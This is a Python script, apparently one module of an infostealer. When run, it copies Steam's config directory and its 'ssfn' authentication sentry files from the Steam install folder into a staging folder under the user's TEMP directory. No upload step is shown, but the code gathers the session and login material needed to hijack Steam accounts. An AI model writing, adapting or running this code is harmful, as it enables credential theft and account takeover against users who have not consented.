import os
import shutil

def steam_st():
    # Output folder
    output_dir = os.path.join(os.environ['TEMP'], "output", "Applications", "Steam")
    os.makedirs(output_dir, exist_ok=True)

    # Steam paths
    steam_path = os.path.join(os.environ.get("PROGRAMFILES(X86)", ""), "Steam")
    if not os.path.exists(steam_path):
        print("Steam folder not found.")
        return

    steam_config_path = os.path.join(steam_path, "config")
    ssfn_files = [os.path.join(steam_path, file) for file in os.listdir(steam_path) if file.startswith("ssfn")]

    # Copy config files
    if os.path.exists(steam_config_path):
        for root, dirs, files in os.walk(steam_config_path):
            for file in files:
                src_file = os.path.join(root, file)
                rel_path = os.path.relpath(root, steam_path)
                dest_dir = os.path.join(output_dir, rel_path)
                os.makedirs(dest_dir, exist_ok=True)
                shutil.copy2(src_file, os.path.join(dest_dir, file))

    # Copy SSFN files
    for ssfn_file in ssfn_files:
        shutil.copy2(ssfn_file, os.path.join(output_dir, os.path.basename(ssfn_file)))

    print(f"Files copied to: {output_dir}")

steam_st()
